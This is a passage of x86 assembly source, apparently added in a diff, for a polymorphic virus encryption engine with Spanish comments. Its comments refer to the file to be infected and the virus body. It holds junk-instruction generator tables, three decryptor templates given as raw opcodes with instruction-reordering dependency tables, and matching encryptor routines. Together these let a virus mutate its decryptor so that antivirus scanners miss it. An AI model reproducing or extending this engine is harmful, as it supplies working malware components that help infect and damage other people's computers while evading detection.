+startencaddrparam dd 0     ;direccion del primer byte a encriptar
+startbufaddrparam dd 0     ;direccion del primer byte del buffer
+sizeparam         dd 0     ;Tama¤o del encriptor
+loadaddrparam     dd 0     ;Direccion Base del dec en el archivo a infectar
+regini            db 0     ;Indica los registros inicializados
+regbloq           db 0     ;Indica los registros utilizados por el
+                           ;decriptor
+regopera          db 0     ;indica los registros a los que se a realizado
+                           ;alguna operacion
+startdiraenc      dd 0     ;Aqu¡ esta la posicion del encriptor donde
+                           ;esta la direccion del cuerpo a encriptar
+                           ;Se necesitara rellenar esa posicion del encriptor
+                           ;cuando tengamos el decriptor generado y el cuerpo
+                           ;del virus este al final de este.
+startdiradec      dd 0     ;Y aqui la posicion equivalente en el decriptor
+                           ;ya genereado en memoria
+encaddr           dd 0     ;Direccion de la rutina de encriptacion
+destinosaltoabs   dd 0     ;Direccion absoluta del salto absoluto
+destinosaltorel   dd 0     ;Direccion absoluta del salto relativo
+origensaltoabs    dd 0     ;Direccion origen del salto absoluto
+origensaltorel    dd 0     ;Direccion origen del salto relativo
+addrtabladep      dd 0     ;Direccion de la tabla de dependencias
+mascarareord      dd 0     ;Es la mascara de reordenacion inicialmente
+                           ;hay tantos bits a 1 como instrucciones tiene el
+                           ;decriptor , amedida que se van reordenando las
+                           ;instrucciones se ponen esos bits a 0
+profundidad       dd 0h    ;Numero de rutinas anidadas que se estan ejecutando
+
+tiposbasura       dd 010h;  ;Numero diferentes de tipos de basura
+
+tablabasuras:
+                dd offset mete_salto_condicional
+                dd offset mete_comparacion_reg_reg
+                dd offset mete_nop
+                dd offset mete_mov_inmediato
+                dd offset mete_mov_byte_inmediato
+                dd offset mete_push_pop
+                dd offset a_cero_con_xor_sub
+                dd offset a_cero_con_xor_sub
+                dd offset mete_inc_dec
+                dd offset mete_rotacion_inm
+                dd offset mete_add_adc_sub_sbb_or_and_inm
+                dd offset mete_bucle_cont_des
+                dd offset mete_mov_reg_reg
+                dd offset mete_rutina
+                dd offset mete_call
+                dd offset debloquea_reg
+
+off_a_rutinas:  dd 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
+off_a_llamadas: dd 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
+                dd 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
+                dd 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
+
+nocalls         dd 00h   ;a 0 permite calls a 1 no lo permite
+
+estructreloc:
+
+inistartaddr  dd 0h                   
+relocabsaddr  dd 0h                   
+relocreladdr  dd 0h
+despinistartaddr dd 0h               
+desprelocabsaddr dd 0h                
+desprelocreladdr dd 0h             
+saltoabsdestino  dd  0h                
+saltoreldestino  dd  0h                                                     
+
+DECRIPTOR:        ;Aqu¡ residira el decriptor ya reordenado
+         db 0100h dup(0h)
+
+;***** Comienza la estructura Decritor con informacion acerca de *******
+;*****               los decriptors disponibles                  *******
+
+numdec         dd  3h                   ;numero de decriptors
+
+tabladec:              ;direccion de los decriptors
+               dd  offset SRD1       
+               dd  offset SRD2
+               dd  offset SRD3
+               dd  00h
+
+SRD1:
+
+sizeaddr1      dd offset opsdec1+3      ;puntero a la posicion del decriptor
+                                        ;donde esta el tama¤o a encriptar
+encsizeaddr1   dd offset enc1+1         ;puntero a la posicion del encriptor
+                                        ;donde esta el tama¤o a encriptar
+randomaddr1    dd offset opsdec1+22     ;puntero a la posicion donde esta la
+                                        ;clave de encriptacion
+encrandomaddr1 dd offset enc1+14        ;puntero a la posicion donde esta la
+                                        ;clave de encriptacion en el dec
+encstartaddr1  dd offset enc1+6         ;Puntero donde esta el puntero a la
+                                        ;zona a encriptar
+
+                                ;Orden de los registros desde el menos sign.
+                                ;eax/ecx/edx/ebx/?/ebp/esi/edi
+
+regini1        db 00h           ;Indica los registros inicializados
+regbloq1       db 0C2h          ;Indica los registros utilizados por el
+                                ;decriptor
+regopera1      db 0h            ;Indica los registros a los que se a realizado
+                                ;alguna operacion
+
+numdeinst1     dd 9h            ;Numero de Instrucciones
+
+encaddr1       dd offset enc1   ;Direccion de la rutina de encriptacion
+
+punterotabladep1  dd  offset tabladep1   ;puntero a la tabla de dependencias
+
+mascarareord1  dd 01ffh        ;la mascara de reordenacion
+
+structrel1     dd offset estructreloc1
+
+decaddr1       dd offset opsdec1 ;Direccion de la estructura de desencriptado
+
+estructreloc1:          ;Ojo los numero de instruccion estan al reves
+                        ;por motivo de dise¤o
+                        ;por lo tanto la instruccion 9 es la primera
+                        ;8 la segunda y la instruccion 0 es la siguiente
+                        ;la ultima instruccion. (para poder permitir saltos)
+                        ;a la siguiente instruccion del decriptor.
+
+inistartaddr1  dd 8h                    ;El numero de instruccion
+                                        ;que se encarga de inicializar
+relocabsaddr1  dd 2h                    ;Valor necesario para realocatear
+
+relocreladdr1  dd 3h
+
+despinistartaddr1 dd 1h                 ;el desplazamiento respecto
+                                        ;al comienzo de la instruccion
+desprelocabsaddr1 dd 1h                 ;Desplazamiento del valor respecto
+                                        ;al comienzo de instrucciones
+desprelocreladdr1 dd 2h                 ;Desplazamiento del byte con la
+                                        ;direccion del salto relativo
+saltoabsdestino1  dd  6h                ;Con el salto absoluto salto a la
+                                        ;instruccion 6h
+saltoreldestino1  dd  0h                ;Con el salto relativo salto a la                                        ;instrucion 0 es decir la ultima
+
+tabladep1:    ;Aqui reside la tabla de dependencias
+              ;Cada linea contiene el numero de linea
+              ;de las instrucciones de las que depende
+              ;(es decir las que tienen que ir antes que ella)
+              ;las lineas tienen una longitud max de 16 bytes
+              ;lo que limita las posibles instrucciones del
+              ;decriptor a 15
+
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 02h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,08h,0h,0h,0h,0h,0h,0h,0h,0h
+
+    ; (tama¤o)/(mascara de bits inicializados)/(opcodes de instrucciones)
+opsdec1  db 05h,002h,0b9h,00h,00h,00h,00h        ;mov ecx,viriisize/4
+         db 05h,080h,0bfh,00h,00h,00h,00h        ;mov edi,comienzo de la rutina
+         db 02h,040h,08bh,0f7h                   ;mov esi,edi    
+         db 06h,00h,081h,037h,00h,00h,00h,00h   ;xor dword ptr [edi],randomvalor
+         db 01h,00h,0a5h                        ;movsd
+         db 02h,00h,049h,09ch                   ;dec ecx /pushfd
+         db 03h,00h,09dh,074h,00h               ;popfd/je otro
+         db 05h,00h,068h,00h,00h,00h,00h        ;push inmediato
+         db 01h,00h,0c3h                        ;ret
+                                                ;FIN OF Opcode STRUCTURE 
+enc1:
+            db 0b9h,00h,00h,00h,00h        ;mov ecx,viriisize/4
+            db 0bfh,00h,00h,00h,00h        ;mov edi,comienzo de la rutina
+            db 08bh,0f7h                   ;mov esi,edi    
+salto1:     db 081h,037h,00h,00h,00h,00h   ;xor dword ptr [edi],randomvalor
+            db 0a5h                        ;movsd
+            db 049h                        ;dec ecx 
+            jne salto1
+            ret
+
+SRD2:
+sizeaddr2      dd offset opsdec2+10      
+encsizeaddr2   dd offset enc2+6         
+randomaddr2    dd offset opsdec2+24     
+encrandomaddr2 dd offset enc2+14        
+encstartaddr2  dd offset enc2+1         
+regini2        db 00h           
+regbloq2       db 0C5h          
+regopera2      db 0h            
+numdeinst2     dd 9h            
+encaddr2       dd offset enc2
+punterotabladep2  dd  offset tabladep2
+mascarareord2  dd 01ffh    
+structrel2     dd offset estructreloc2
+decaddr2       dd offset opsdec2
+
+estructreloc2:
+
+inistartaddr2  dd 9h                   
+relocabsaddr2  dd 2h                   
+relocreladdr2  dd 3h
+despinistartaddr2 dd 1h               
+desprelocabsaddr2 dd 1h                
+desprelocreladdr2 dd 2h             
+saltoabsdestino2  dd  6h                
+saltoreldestino2  dd  0h                                                     
+
+tabladep2:
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,08h,0h,0h,0h,0h,0h,0h,0h,0h
+
+    ; (tama¤o)/(mascara de bits inicializados)/(opcodes de instrucciones)
+opsdec2:
+         db 05h,040h,0beh,00h,00h,00h,00h    ;mov esi,iniaencriptar
+         db 05h,04h,0bah,00h,00h,00h,00h     ;mov edx,tama¤o
+         db 02h,080h,08bh,0feh               ;mov edi,esi
+         db 01h,01h,0ADh                     ;lodsd
+         db 05h,00h,02Dh,00h,00h,00h,00h     ;sub  eax,clave
+         db 01h,00h,0ABh                     ;stosd
+         db 03h,00h,04ah,074h,00h            ;dec edx/je otro
+         db 05h,00h,0b8h,00h,00h,00h,00h     ;mov eax,0000000h
+         db 02h,00h,0ffh,0e0h                ;jmp eax
+
+enc2:
+         db 0beh,00h,00h,00h,00h     ;mov esi,iniaencriptar
+         db 0bah,00h,00h,00h,00h     ;mov edx,tama¤o
+         db 08bh,0feh                ;mov edi,esi
+  salto2:
+         db 0adh                     ;lodsd
+         db 005h,00h,00h,00h,00h     ;add  eax,clave
+         db 0abh                     ;stosd
+         db 04ah                     ;dec edx
+         jne salto2
+
+         ret
+
+SRD3:
+sizeaddr3      dd offset opsdec3+41     
+encsizeaddr3   dd offset enc3+19         
+randomaddr3    dd offset opsdec3+25     
+encrandomaddr3 dd offset enc3+9        
+encstartaddr3  dd offset enc3+3
+regini3        db 00h           
+regbloq3       db 02Ch          
+regopera3      db 0h            
+numdeinst3     dd 11            
+encaddr3       dd offset enc3
+punterotabladep3  dd  offset tabladep3
+mascarareord3  dd 07ffh    
+structrel3     dd offset estructreloc3
+decaddr3       dd offset opsdec3
+
+estructreloc3:
+
+inistartaddr3  dd 9h                   
+relocabsaddr3  dd 2h                   
+relocreladdr3  dd 3h
+despinistartaddr3 dd 1h               
+desprelocabsaddr3 dd 1h                
+desprelocreladdr3 dd 7h             
+saltoabsdestino3  dd 7h                
+saltoreldestino3  dd 0h                                                     
+
+tabladep3:
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,06h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,08h,0h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,08h,09h,0h,0h,0h,0h,0h,0h,0h
+         db 01h,02h,03h,04h,05h,06h,07h,08h,09h,0Ah,0h,0h,0h,0h,0h,0h
+
+    ; (tama¤o)/(mascara de bits inicializados)/(opcodes de instrucciones)
+opsdec3:
+         db 02h,020h,02bh,0edh    ;sub ebp,ebp
+         db 02h,08h,033h,0dbh     ;xor ebx,ebx
+         db 05h,04h,0bah,00h,00h,00h,00h ;mov edx,diraencriptar
+         db 01h,00h,055h          ;push ebp
+         db 01h,00h,05dh          ;pop  ebp
+         db 06h,00h,081h,02ah,00h,00h,00h,00h ;sub dword ptr [edx],clave
+         db 03h,00h,083h,0c2h,04h  ;add edx,4
+         db 01h,00h,043h           ;inc ebx
+         db 08h,00h,081h,0fbh,00h,00h,00h,00h,074h,00h
+                                   ;cmp ebx,size /je salto
+         db 05h,00h,0bdh,00h,00h,00h,00h  ;mov ebp,salto
+         db 02h,00h,0ffh,0d5h      ;call ebp
+
+enc3:
+         db 033h,0dbh     ;xor ebx,ebx
+         db 0bah,00h,00h,00h,00h ;mov edx,diraencriptar
+ salto3:
+         db 081h,002h,00h,00h,00h,00h ;sub dword ptr [edx],clave
+         db 083h,0c2h,04h  ;add edx,4
+         db 043h           ;inc ebx
+         db 081h,0fbh,00h,00h,00h,00h
+         jnz salto3
+
+         ret
+
+
+;********************** Fin del Engine 32 *******************************
+
+end:
+        db   offset end - offset start + 1000h dup (0)          ;espacio pa que trabaje el engine
+        end  inicio
+
+                                                              
